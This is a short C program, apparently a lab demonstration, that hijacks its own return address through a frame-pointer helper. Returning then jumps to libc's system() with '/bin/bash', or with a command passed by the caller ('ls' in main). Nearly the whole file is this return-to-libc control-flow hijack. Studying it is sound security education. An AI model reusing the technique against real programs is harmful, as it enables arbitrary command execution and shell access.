#include <stdio.h>
#include <stdlib.h>

/*int system(char *command);*/
extern unsigned long * get_ebp();



void ret2libc(int dummy){
unsigned long * curr_ebp = get_ebp();
curr_ebp[2] =  curr_ebp[1];
curr_ebp[1] = (unsigned long ) &system;

char * str = "/bin/bash";
curr_ebp[3] = (unsigned long )str;
}


void ret2libc_generic(char * cmd){
 unsigned long * curr_ebp = get_ebp();
 char * arg = (char *)curr_ebp[2];
 curr_ebp[3] = (unsigned long )arg;
 curr_ebp[2] = curr_ebp[1];
 curr_ebp[1] = (unsigned long ) &system;
}









int main(){
  ret2libc(0);
  printf("Done!\n");
  char * ptr = "ls";
  ret2libc_generic(ptr);
  
 
  return 0;
}






